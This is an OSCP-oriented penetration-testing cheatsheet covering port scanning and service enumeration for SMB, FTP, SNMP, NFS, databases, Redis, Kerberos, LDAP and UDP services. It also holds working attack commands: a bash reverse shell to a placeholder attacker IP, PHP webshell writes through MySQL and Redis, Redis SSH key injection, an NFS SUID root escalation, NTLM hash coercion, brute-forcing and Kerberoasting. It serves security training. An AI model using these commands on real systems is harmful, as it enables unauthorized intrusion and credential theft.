# Network and Service Enumeration Methodology

> *"Enumerate harder, not exploit harder." - 90% of OSCP blockers stem from incomplete enumeration, not missing exploits.*

---

## Phase 1: Port Scanning and Host Discovery (Always Start Here)

> *See the [[🔎 nmap|Nmap Cheatsheet]] for full syntax and scanning flag references.*

### The OSCP Opener: Standard TCP Port Scanning

Always execute a full TCP port scan against the target as your initial step:

```bash
# [RECON] Comprehensive TCP port scan with default scripts and service version detection
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_$IP $IP

# [RECON] Accelerated SYN scan (use if the full scan takes too long)
sudo nmap -p- -sS --min-rate 1000 -T4 -Pn $IP
```

### Service Triage: Decision Matrix

| Port | Service | Operational Action |
| --- | --- | --- |
| **21** | FTP | → [[#Phase 3: FTP (Port 21)]] |
| **22** | SSH | → [[#Phase 4: SSH (Port 22)]] |
| **23** | Telnet | → [[#Phase 5: Telnet (Port 23)]] |
| **25 / 587** | SMTP | → [[#Phase 6: SMTP (Port 25)]] |
| **53** | DNS | → [[#Phase 7: DNS (Port 53)]] |
| **69** | TFTP (UDP) | → [[#TFTP (Port 69 - UDP)]] |
| **80 / 443** | HTTP / HTTPS | → [[02-Web-Attack]] |
| **88** | Kerberos | → [[#Phase 15: Kerberos (Port 88)]] |
| **110 / 143** | POP3 / IMAP | Check for cleartext credentials and login brute-force |
| **111** | RPCbind | Query registered services: `rpcinfo -p [TARGET_IP]` (look for NFS) |
| **123** | NTP (UDP) | → [[#NTP (Port 123 - UDP)]] |
| **135 / 139** | RPC | → [[#Phase 14: RPC (Ports 135, 139)]] |
| **139 / 445** | SMB | → [[#Phase 2: SMB (Ports 139, 445)]] |
| **161** | SNMP (UDP) | → [[#Phase 8: SNMP (Port 161 - UDP)]] |
| **389 / 636** | LDAP | → [[#Phase 16: LDAP (Ports 389, 636)]] |
| **500 / 4500** | IKE / IPsec (UDP) | → [[#IKE and IPsec VPN (Ports 500, 4500 - UDP)]] |
| **1433** | MSSQL | → [[#Phase 11: MSSQL (Port 1433)]] |
| **2049** | NFS | → [[#Phase 9: NFS (Port 2049)]] |
| **3306** | MySQL | → [[#Phase 10: MySQL (Port 3306)]] |
| **3389** | RDP | → [[#Phase 17: RDP (Port 3389)]] |
| **5985 / 5986** | WinRM | → [[#Phase 13: WinRM (Ports 5985, 5986)]] |
| **6379** | Redis | → [[#Phase 12: Redis (Port 6379)]] |

> 💡 **OSCP Rule:** If you encounter an unfamiliar port, search: `"port [NUMBER] service exploit"`. OffSec exams regularly host applications on non-standard high ports.
> ⚠️ **Always open unknown web services (such as 7990, 8080, 8443, 9000, 10000) directly in your browser!**

### UDP Port Scanning (Crucial Step)

UDP scanning is frequently neglected due to latency, but critical vectors reside on UDP:

```bash
# [RECON] Scan top 20 UDP ports: catches SNMP (161), TFTP (69), DNS (53), NTP (123)
sudo nmap -sU --top-ports 20 --max-retries 1 -oA nmap/udp_top20_$IP $IP
```

### Network Sweep: Subnet Host Discovery

When pivoting into an internal network or scanning an Active Directory multi-machine range:

```bash
# Fast ICMP Ping Sweep across an entire /24 subnet
sudo nmap -sn 192.168.1.0/24 -oG sweep_hosts.txt

# Fast TCP SYN discovery on common administrative ports
sudo nmap -sS -p 22,80,445,3389 192.168.1.0/24 -oG sweep_services.txt
```

### Native Port Scanning from Windows (PowerShell - Living off the Land)

When operating from a compromised Windows machine without external binaries or Nmap:

```powershell
# Scan TCP ports 1 through 1024 on an internal target host
1..1024 | ForEach-Object {
    $socket = New-Object Net.Sockets.TcpClient
    try {
        $socket.Connect("192.168.50.151", $_)
        "TCP Port $_ is OPEN"
    } catch {} finally {
        $socket.Dispose()
    }
}
```

---

## Phase 2: SMB (Ports 139, 445)

> *Server Message Block (SMB): File and resource sharing protocol on Windows (and Samba on Linux). One of the most common initial access vectors in the OSCP curriculum.*

### Step 1: Automated Enumeration with NetExec and enum4linux

```bash
# [ENUM] Modern SMB null session and guest access check via NetExec
nxc smb [TARGET_IP] -u '' -p '' --shares
nxc smb [TARGET_IP] -u 'guest' -p '' --shares

# [ENUM] Comprehensive enumeration with enum4linux
enum4linux -a [TARGET_IP]
```

**Key reconnaissance data to extract:**
- **Users list**: Potential login targets for password spraying or Kerbrute enumeration.
- **Share names**: Accessible file shares (pay special attention to non-default custom shares).
- **OS signature**: Windows version and build number (check against known kernel exploits).
- **Password policy**: Account lockout threshold (determines whether password spraying is safe).

### Step 2: Listing Available Shares

```bash
# [ENUM] List shares using a null session
smbclient -L //[TARGET_IP]/ -N

# [ENUM] List shares with authenticated credentials
smbclient -L //[TARGET_IP]/ -U [USERNAME]
```

### Step 3: Accessing and Interacting with Shares

```bash
# [ENUM] Connect to a share anonymously
smbclient //[TARGET_IP]/[SHARE_NAME] -N

# [ENUM] Connect using credentials
smbclient //[TARGET_IP]/[SHARE_NAME] -U [USERNAME]
```

**Essential SMBClient commands:**

| Command | Action |
| --- | --- |
| `ls` or `dir` | List files and directories |
| `cd [DIR]` | Change remote directory |
| `get [FILE]` | Download a file to your local machine |
| `mget *` | Download all files in the current folder |
| `put [FILE]` | Upload a local file to the remote share (if writable) |

### Step 4: Identifying High-Value Misconfigurations

- **Anonymous / Guest access**: Connect with `-N` (no password) or `-U Anonymous`. If access succeeds, recursively inspect every file.
- **Writable shares**: If you can write files (`put`), look for execution triggers (scheduled tasks, web server document roots, DLL hijacking).
- **Sensitive files to search for**: `*.txt`, `*.conf`, `*.cfg`, `*.ini`, `*.bak`, `*.xml`, `*.xlsx`, `*.docx`, `id_rsa`, `web.config`, `unattend.xml`.
- **User profile inspection**: If the `Users` or `C$` share is accessible, thoroughly audit user directories:
  - `\Users\[USER]\Desktop\`: CTF flags, sensitive operational files.
  - `\Users\[USER]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`: **PowerShell history (frequently reveals cleartext passwords and administrative commands!)**
  - `\Users\[USER]\Documents\`: Custom scripts, configuration backups, connection parameters.

### Escalation to Shell

| Finding | Path to Shell |
| --- | --- |
| **Credentials discovered in files** | Test across SSH, WinRM, RDP, SMB, and Web portals |
| **SSH private key (`id_rsa`)** | `chmod 600 id_rsa` → `ssh -i id_rsa [USER]@[TARGET_IP]` |
| **Writable share mapped to web root** | Upload webshell or reverse shell → execute via browser |
| **Known SMB vulnerability** (e.g., EternalBlue MS17-010) | Query `searchsploit ms17-010` or verify with `nmap --script smb-vuln* [TARGET_IP]` |

---

## Phase 3: FTP (Port 21)

> *File Transfer Protocol (FTP): Legacy cleartext file transfer protocol. The primary check is anonymous authentication and file write access.*

### Step 1: Testing Anonymous Login

```bash
# [ENUM] Check anonymous login manually
ftp [TARGET_IP]
# Username: anonymous
# Password: (press Enter or type anonymous)
```

**If anonymous authentication succeeds:**
```bash
# Switch to binary mode for file integrity
binary

# List all files including hidden entries
ls -la

# Download all accessible files
mget *
```

### Step 2: Credential Brute-Force (If Anonymous is Disabled)

```bash
# [ATTACK] Hydra brute-force using an enumerated username
hydra -t 4 -l [USERNAME] -P /usr/share/wordlists/rockyou.txt -vV [TARGET_IP] ftp
```

### Step 3: Checking Write Permissions and Web Overlap

```bash
# Test file upload
put test.txt
```

If the FTP directory overlaps with a web server document root (e.g., `/var/www/html/` or `C:\inetpub\wwwroot\`), upload a PHP, ASP, or ASPX webshell and trigger it over HTTP.

### Escalation to Shell

| Finding | Path to Shell |
| --- | --- |
| **Hardcoded credentials in downloaded files** | Attempt login across SSH, SMB, web applications |
| **Application configuration files** (`wp-config.php`, `config.php`) | Extract database credentials and evaluate credential reuse |
| **Writable FTP root mapped to web server** | Upload reverse shell payload → trigger via `http://[TARGET]/shell.php` |
| **Vulnerable FTP daemon** (vsftpd 2.3.4, ProFTPD 1.3.5) | Query `searchsploit [version]` for known remote exploits |

---

## Phase 4: SSH (Port 22)

> *Secure Shell (SSH): Encrypted remote administration. Typically serves as your post-credential foothold rather than an initial vulnerability.*

### Establishing SSH Sessions

```bash
# [ACCESS] Password authentication
ssh [USERNAME]@[TARGET_IP]

# [ACCESS] Private key authentication
chmod 600 id_rsa
ssh -i id_rsa [USERNAME]@[TARGET_IP]

# [ACCESS] Connecting to non-standard ports
ssh [USERNAME]@[TARGET_IP] -p [PORT]

# [ACCESS] Legacy cipher support (essential for older OSCP machines)
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa [USERNAME]@[TARGET_IP]
```

### Banner Grabbing and OS Fingerprinting

```bash
# [ENUM] Interrogate SSH algorithms and banner
nmap -p 22 --script ssh2-enum-algos,ssh-hostkey [TARGET_IP]
```

The SSH banner version (e.g., `OpenSSH 7.2p2 Ubuntu 4ubuntu2.8`) accurately pinpoints the underlying Linux distribution and OS release.

---

## Phase 5: Telnet (Port 23)

> *Telnet: Unencrypted legacy terminal protocol. If enabled on an OSCP host, it frequently indicates misconfigurations, custom administrative menus, or backdoors.*

### Connecting to Telnet

```bash
# [ENUM] Connect to Telnet service
telnet [TARGET_IP] [PORT]
# Or using netcat
nc -vn [TARGET_IP] 23
```

### What to Inspect

- **Service banners**: Hostname, hardware architecture, firmware revision.
- **Custom administrative menus**: Applications presenting restricted consoles or escape options.
- **Direct command execution**: Check if the prompt accepts Linux shell commands directly.

### Reverse Shell Injection

If connected to a misconfigured or root prompt, spawn a reverse shell to your listener:

```bash
# Trigger bash reverse shell back to Kali
bash -i >& /dev/tcp/[KALI_IP]/[LPORT] 0>&1
```

> *See the [[🐢 reverse-shells|Reverse Shells Cheatsheet]] for alternative shell payloads.*

---

## Phase 6: SMTP (Port 25)

> *Simple Mail Transfer Protocol (SMTP): Mail exchange service. In penetration testing, it is primarily leveraged for user enumeration via `VRFY`, `EXPN`, or `RCPT TO` commands.*

### Step 1: Banner Grabbing

```bash
# [ENUM] Interrogate SMTP commands and service banner
nmap -p 25 --script smtp-commands [TARGET_IP]

# Manual connection via netcat
nc -vn [TARGET_IP] 25
```

### Step 2: User Enumeration (Manual and Automated)

**Manual Validation via Telnet / Netcat:**

```text
VRFY root
VRFY admin
VRFY [USERNAME]
EXPN staff
```

| Response Code | Meaning |
| --- | --- |
| `250` or `252` | User exists ✅ |
| `550` | User does not exist ❌ |
| `502` | Command disabled / not implemented |

**Automated Enumeration via smtp-user-enum:**

```bash
# [ENUM] Enumerate valid usernames using a wordlist
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t [TARGET_IP]

# If VRFY is disabled, test the RCPT method
smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t [TARGET_IP]
```

---

## Phase 7: DNS (Port 53)

> *Domain Name System (DNS): Resolves human-readable domain names to IP addresses. A misconfigured DNS server permitting AXFR zone transfers exposes internal hostnames and network topology.*

### Step 1: Identifying the Domain Name

Domain names frequently appear in Nmap LDAP outputs, SSL/TLS certificates, or SMB signatures:

```bash
# Discover domain name from LDAP
nmap -p 389 --script ldap-rootdse [TARGET_IP]

# Extract domain information from RDP NTLM authentication
nmap -p 3389 --script rdp-ntlm-info [TARGET_IP]
```

### Step 2: DNS Zone Transfer (AXFR)

```bash
# [ENUM] Attempt zone transfer against target DNS server
dig axfr [DOMAIN] @[TARGET_IP]

# Example
dig axfr lab.enterprise.thm @10.10.10.5
```

If successful, the transfer outputs the full list of DNS records, internal subdomains, and hostnames.

### Step 3: Subdomain Enumeration

```bash
# Reverse DNS lookup (IP to Hostname)
dig -x [TARGET_IP] @[TARGET_IP]

# Subdomain brute-forcing via Gobuster
gobuster dns -d [DOMAIN] -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r [TARGET_IP]:53
```

---

## Phase 8: SNMP (Port 161 - UDP)

> *Simple Network Management Protocol (SNMP): UDP-based network monitoring service. A misconfigured SNMP service with default community strings leaks running processes, network connections, installed software, and cleartext credentials.*

### Step 1: Discovering Community Strings

SNMP relies on community strings for authentication. Common defaults are `public` (read-only) and `private` (read/write):

```bash
# [ENUM] Brute-force SNMP community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt [TARGET_IP]
```

### Step 2: Full MIB Tree Enumeration

```bash
# Full SNMPwalk dump to file
snmpwalk -v2c -c public [TARGET_IP] . > snmp_full.txt
snmpbulkwalk -v2c -c public [TARGET_IP] . > snmp_bulk.txt

# Search for sensitive keywords in dump
grep -i -E "pass|pwd|user|admin|key" snmp_full.txt
```

### Step 3: Targeted OID Querying

| Information | Target OID | Command |
| --- | --- | --- |
| **Windows Users** | `1.3.6.1.4.1.77.1.2.25` | `snmpwalk -v2c -c public [TARGET_IP] 1.3.6.1.4.1.77.1.2.25` |
| **Running Processes** | `1.3.6.1.2.1.25.4.2.1.2` | `snmpwalk -v2c -c public [TARGET_IP] 1.3.6.1.2.1.25.4.2.1.2` |
| **Installed Software** | `1.3.6.1.2.1.25.6.3.1.2` | `snmpwalk -v2c -c public [TARGET_IP] 1.3.6.1.2.1.25.6.3.1.2` |
| **Listening TCP Ports** | `1.3.6.1.2.1.6.13.1.3` | `snmpwalk -v2c -c public [TARGET_IP] 1.3.6.1.2.1.6.13.1.3` |

### Step 4: Automated Tool (snmp-check)

```bash
# Automated parsing of system information, storage, users, and processes
snmp-check [TARGET_IP] -c public
```

---

## Phase 9: NFS (Port 2049)

> *Network File System (NFS): Remote directory mounting protocol. Can be mounted directly on Kali to inspect files, extract SSH keys, or exploit `no_root_squash` configurations for instant root privilege escalation.*

### Step 1: Enumerating Exported Shares

```bash
# [ENUM] Query NFS exports from target
showmount -e [TARGET_IP]
```

### Step 2: Mounting the Remote Share Locally

```bash
# Create local mount directory
sudo mkdir -p /tmp/nfs_mount

# Mount exported share without locking
sudo mount -t nfs [TARGET_IP]:[SHARE_PATH] /tmp/nfs_mount -nolock

# Example
sudo mount -t nfs 10.10.10.5:/home /tmp/nfs_mount -nolock
```

### Step 3: Inspecting Mounted Data

```bash
# Search for private keys and sensitive configurations
find /tmp/nfs_mount/ -type f \( -name "*.txt" -o -name "*.conf" -o -name "id_rsa" -o -name "*.bak" \) 2>/dev/null
```

### Step 4: Exploiting `no_root_squash` (Root Privilege Escalation)

When `no_root_squash` is active on an exported share, remote root users retain root UID (0) privileges on the share. This allows uploading a binary with the SUID bit set:

```bash
# [KALI] Step 1: Copy bash into the mounted share
cp /bin/bash /tmp/nfs_mount/bash_suid

# [KALI] Step 2: Assign root ownership and enable SUID bit
sudo chown root:root /tmp/nfs_mount/bash_suid
sudo chmod +s /tmp/nfs_mount/bash_suid

# [TARGET] Step 3: From low-privileged target shell, execute SUID binary
/path/to/share/bash_suid -p
# Result: uid=0(root) gid=0(root)
```

> ⚠️ **Architecture Compatibility Note:** The copied bash binary must match the target system architecture. If Kali's bash fails to execute, download `/bin/bash` directly from the target first.

---

## Phase 10: MySQL (Port 3306)

> *Relational database management service. Typically accessed after discovering credentials in web application configuration files.*

### Step 1: Connecting to MySQL

```bash
# Standard connection
mysql -h [TARGET_IP] -u [USERNAME] -p

# Disable SSL/TLS if negotiation errors occur
mysql -h [TARGET_IP] --ssl-mode=DISABLED -u [USERNAME] -p
```

### Step 2: Essential SQL Enumeration Queries

```sql
SHOW DATABASES;
USE [database_name];
SHOW TABLES;
DESCRIBE [table_name];
SELECT * FROM [table_name];
```

### Step 3: Dumping User Hashes

```sql
-- Dump MySQL user credential hashes
SELECT user, authentication_string FROM mysql.user;
-- Legacy MySQL versions:
SELECT user, password FROM mysql.user;
```

Crack extracted hashes with Hashcat mode 300:

```bash
hashcat -m 300 mysql_hashes.txt /usr/share/wordlists/rockyou.txt
```

> *See the [[⛏️ hashcat-john|Hashcat & John Cheatsheet]] for full hash mode lists.*

### Step 4: Arbitrary File Read and Web Shell Write

```sql
-- Read local system files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');

-- Write PHP web shell into accessible web root
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

---

## Phase 11: MSSQL (Port 1433)

> *Microsoft SQL Server: Common in Active Directory and Windows enterprise environments.*

### Connect and Execute System Commands

```bash
# Connect using Impacket mssqlclient
impacket-mssqlclient [DOMAIN]/[USER]:[PASSWORD]@[TARGET_IP] -windows-auth

# Enable and execute commands via xp_cmdshell
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

### Forced NetNTLMv2 Authentication via xp_dirtree

Coerce an outbound SMB connection to a rogue Responder listener to capture service account NetNTLMv2 hashes:

```sql
-- Coerce outbound connection to attacker machine
SQL> xp_dirtree '\\KALI_IP\fake_share'
```

> *See [[05-Active-Directory|Active Directory Methodology]] for linked servers and token delegation attacks.*

---

## Phase 12: Redis (Port 6379)

> *Redis in-memory key-value store. Frequently configured without authentication on internal networks.*

### Basic Connection and Enumeration

```bash
# Connect to Redis
redis-cli -h [TARGET_IP]

# Interrogate server configuration and keyspaces
127.0.0.1:6379> INFO
127.0.0.1:6379> KEYS *
127.0.0.1:6379> GET "key_name"
```

### Exploitation Vectors

1. **SSH Key Injection (Linux):**
   ```bash
   redis-cli -h [TARGET_IP]
   127.0.0.1:6379> CONFIG SET dir /root/.ssh/
   127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
   127.0.0.1:6379> SET payload "\n\nssh-rsa AAAAB3NzaC1yc2E... kali\n\n"
   127.0.0.1:6379> SAVE
   ```

2. **Web Shell Upload:**
   ```bash
   127.0.0.1:6379> CONFIG SET dir /var/www/html/
   127.0.0.1:6379> CONFIG SET dbfilename shell.php
   127.0.0.1:6379> SET payload "<?php system($_GET['cmd']); ?>"
   127.0.0.1:6379> SAVE
   ```

3. **Forced Windows NetNTLMv2 Authentication (Responder):**
   ```bash
   127.0.0.1:6379> CONFIG SET dir \\KALI_IP\fake
   ```

---

## Phase 13: WinRM (Ports 5985, 5986)

> *Windows Remote Management (WinRM): The administrative management protocol for Windows. Port 5985 runs HTTP; port 5986 runs HTTPS.*

```bash
# [ACCESS] Authenticate with password
evil-winrm -i [TARGET_IP] -u [USERNAME] -p [PASSWORD]

# [ACCESS] Authenticate using NTLM Hash (Pass-the-Hash)
evil-winrm -i [TARGET_IP] -u [USERNAME] -H [NTLM_HASH]

# [ACCESS] Connect over SSL (Port 5986)
evil-winrm -i [TARGET_IP] -u [USERNAME] -p [PASSWORD] -S
```

---

## Phase 14: RPC (Ports 135, 139)

> *Remote Procedure Call (RPC): Allows querying domain and local security authorities for users, groups, and password policies.*

### Step 1: Null Session Connection

```bash
# [ENUM] Connect without credentials via rpcclient
rpcclient -U "" -N [TARGET_IP]
```

### Step 2: Essential RPC Enumeration Commands

```bash
rpcclient $> enumdomusers        # Enumerate all domain users
rpcclient $> enumdomgroups       # Enumerate all domain groups
rpcclient $> querydispinfo       # Enumerate user descriptions (frequently contains cleartext passwords!)
rpcclient $> querydominfo        # Domain details and user counts
rpcclient $> queryuser [RID]     # Detailed user record by RID (e.g., 0x1f4 for Administrator)
rpcclient $> lookupnames [USER]  # Resolve username to RID
rpcclient $> getdompwinfo        # Domain password policy (lockout threshold, minimum length)
rpcclient $> netshareenumall     # Enumerate all available shares
```

> 💡 **If null sessions are rejected (`STATUS_ACCESS_DENIED`),** repeat authenticated queries using any discovered valid account:
> `rpcclient -U "username%password" [TARGET_IP]`

---

## Phase 15: Kerberos (Port 88)

> *Kerberos: Active Directory authentication service. The presence of port 88 confirms the host is a Domain Controller.*

### Domain User Enumeration via Kerbrute

```bash
# [ENUM] Validate usernames against the Domain Controller without credentials
./kerbrute userenum -d [DOMAIN] --dc [DC_IP] /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### Core Kerberos Attack Vectors

1. **AS-REP Roasting (No credentials required):**
   Identifies accounts with `DONT_REQ_PREAUTH` enabled and extracts TGT tickets:
   ```bash
   impacket-GetNPUsers [DOMAIN]/ -usersfile users.txt -dc-ip [DC_IP] -no-pass
   ```
   Crack extracted hashes with Hashcat mode `18200`.

2. **Kerberoasting (Requires valid domain user):**
   Requests service tickets (TGS-REP) for accounts with configured Service Principal Names (SPNs):
   ```bash
   impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request
   ```
   Crack extracted hashes with Hashcat mode `13100`.

> *See [[05-Active-Directory|Active Directory Methodology]] for complete Active Directory attack paths.*

---

## Phase 16: LDAP (Ports 389, 636)

> *Lightweight Directory Access Protocol (LDAP): Active Directory directory database service.*

### Constructing the Correct Base DN

Each dot-separated token in the domain name translates to a distinct `DC=` component:
- `razorblack.thm` → `DC=razorblack,DC=thm`
- `lab.enterprise.thm` → `DC=lab,DC=enterprise,DC=thm`
- `corp.local` → `DC=corp,DC=local`

### Step 1: Base DN Discovery

```bash
# [ENUM] Automatically extract namingContexts from rootDSE
ldapsearch -x -H ldap://[TARGET_IP] -s base namingContexts
```

### Step 2: Anonymous and Authenticated LDAP Queries

```bash
# [ENUM] Extract all user objects and descriptions anonymously
ldapsearch -x -H ldap://[TARGET_IP] -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description

# [ENUM] Authenticated LDAP extraction
ldapsearch -x -H ldap://[TARGET_IP] -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description memberOf
```

> 💡 **The `description` attribute frequently leaks cleartext initial passwords or deployment secrets.**

### Automated LDAP Enumeration Tools

```bash
# NetExec LDAP user description extraction
nxc ldap [TARGET_IP] -u [USER] -p [PASS] -M get-desc-users
nxc ldap [TARGET_IP] -u [USER] -p [PASS] --users
```

---

## Phase 17: RDP (Port 3389)

> *Remote Desktop Protocol (RDP): Graphical remote administration interface.*

### Connection Methods

```bash
# [ACCESS] Standard credential login
xfreerdp /v:[TARGET_IP] /u:[USER] /p:[PASS] +clipboard /dynamic-resolution /cert:ignore

# [ACCESS] Pass-the-Hash login
xfreerdp /v:[TARGET_IP] /u:[USER] /pth:[NTLM_HASH] +clipboard /dynamic-resolution /cert:ignore

# [ENUM] Validate credentials or test password spraying
nxc rdp [TARGET_IP] -u [USER] -p [PASS]

# [ENUM] Capture remote desktop login screen without credentials (if NLA is disabled)
nxc rdp [TARGET_IP] --screenshot
```

---

## Phase 18: UDP Scanning (TFTP, NTP, SNMP, IKE)

> *UDP services are connectionless, stateless, and significantly slower to scan than TCP. However, they routinely host unauthenticated protocols (TFTP), information leakage services (SNMP, NTP), and cryptographic gateways (IKE/IPsec VPNs) that directly lead to initial footholds.*

### UDP Scanning Strategy and Nmap Optimization

Because UDP scanning relies on ICMP port unreachable responses (`Type 3, Code 3`) which are heavily rate-limited by operating system kernels, scanning all 65,535 UDP ports is impractical in timed exam environments.

```bash
# [RECON] Fast scan of the top 20 most common UDP ports
sudo nmap -sU --top-ports 20 --open -T4 -oA nmap/udp_top20_$IP $IP

# [RECON] Targeted scan against high-value offensive UDP ports
sudo nmap -sU -p 53,69,123,161,500,4500 -Pn -oA nmap/udp_targeted_$IP $IP
```

---

### TFTP (Port 69 - UDP)

> *Trivial File Transfer Protocol (TFTP): Operates over UDP port 69 without authentication or session state. It has no directory listing mechanism (`ls` or `dir`), requiring blind file requests or wordlist fuzzing.*

#### 1. Enumerating Files via Nmap Wordlist Guessing
Because TFTP does not support directory listing, brute-forcing filenames is necessary:

```bash
# [ENUM] Guess known configuration and sensitive filenames
sudo nmap -sU -p 69 --script tftp-enum --script-args tftp-enum.filelist=/usr/share/seclists/Fuzzing/tftp-common-filenames.txt [TARGET_IP]
```

#### 2. Blind File Retrieval and Transfer (tftp-hpa)
Using the native Linux `tftp` client:

```bash
# Connect interactively to the target TFTP server
tftp [TARGET_IP]

# Switch to binary mode (mandatory for executable or compressed files)
tftp> binary

# Attempt to download common configuration files
tftp> get config.txt
tftp> get cisco.cfg
tftp> get network.conf
tftp> get id_rsa
tftp> get backup.tar.gz

# Attempt to write an arbitrary file (testing upload permissions)
tftp> put test.txt
tftp> put shell.php
tftp> quit
```

#### 3. Command-Line Non-Interactive One-Liners

```bash
# Non-interactive download via tftp
tftp [TARGET_IP] -c get config.txt

# Non-interactive upload (e.g., webshell into a known web root)
tftp [TARGET_IP] -c put webshell.php
```

#### Escalation Path
- **Configuration files discovered**: Extract cleartext administrative credentials, SNMP community strings, or VPN pre-shared keys.
- **Writable TFTP directory mapped to web root**: Upload a web shell (`.php`, `.asp`, `.aspx`) and trigger execution via HTTP.

---

### NTP (Port 123 - UDP)

> *Network Time Protocol (NTP): Synchronizes system clocks. In older or misconfigured daemons, administrative queries leak sensitive internal infrastructure details.*

#### 1. Basic Interrogation

```bash
# Query current time synchronization and peer status
ntpq -pn [TARGET_IP]
```

#### 2. Exploiting the `monlist` Vulnerability (CVE-2013-5211)
The `monlist` command returns the IP addresses of the last 600 clients that interacted with the NTP daemon. This reveals internal network ranges, administrator IPs, and potential pivot targets:

```bash
# Query the active monitor list
ntpdc -n -c monlist [TARGET_IP]

# Automated interrogation via Nmap
nmap -sU -p 123 --script ntp-info,ntp-monlist [TARGET_IP]
```

---

### SNMP (Port 161 - UDP)

> *Simple Network Management Protocol: UDP-based management daemon. Refer to [[#Phase 8: SNMP (Port 161 - UDP)]] for full MIB tree walking, community string cracking, and user enumeration.*

Quick refresher command:
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt [TARGET_IP]
snmpwalk -v2c -c public [TARGET_IP] . > snmp_dump.txt
```

---

### IKE and IPsec VPN (Ports 500, 4500 - UDP)

> *Internet Key Exchange (IKE): Key management protocol used to negotiate IPsec VPN tunnels. Exposes VPN gateway software vendors and can be vulnerable to offline Pre-Shared Key (PSK) cracking.*

#### 1. Discovering Active IKE Daemons
Use `ike-scan` to identify the gateway implementation:

```bash
# Discover IKE handshake and detect vendor ID
sudo ike-scan [TARGET_IP]

# Inspect aggressive mode and supported cryptographic suites
sudo ike-scan -M -A -v [TARGET_IP]
```

#### 2. Capturing and Cracking Aggressive Mode Pre-Shared Keys (PSK)
If IKE Aggressive Mode is supported, the gateway transmits the hash of the Pre-Shared Key in cleartext:

```bash
# Capture the aggressive mode handshake into a file for cracking
sudo ike-scan -A -M -v -P [TARGET_IP] > ike_psk.txt

# Convert to hashcat format and crack with dictionary
# Hashcat mode 5400: IKE-PSK MD5 / mode 5401: IKE-PSK SHA1
hashcat -m 5400 ike_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Credential Reuse Checklist

> *Whenever valid credentials (username and password) are recovered, test them systematically across every exposed authentication surface before proceeding.*

```
Recovered Credentials: [USERNAME] : [PASSWORD]

☐ SSH          → ssh [USER]@[TARGET_IP]
☐ FTP          → ftp [TARGET_IP]
☐ SMB          → smbclient //[TARGET_IP]/[SHARE] -U [USER]
☐ Web Portals  → Test across all discovered web login panels
☐ WinRM        → evil-winrm -i [TARGET_IP] -u [USER] -p [PASS]
☐ RDP          → xfreerdp /u:[USER] /p:[PASS] /v:[TARGET_IP] /cert:ignore
☐ Database     → mysql -h [TARGET_IP] -u [USER] -p
☐ Local Users  → Attempt su or sudo on Linux, runas on Windows
```

> **OSCP Reality:** Cross-service password reuse accounts for a large percentage of initial network compromises. Never skip this checklist.
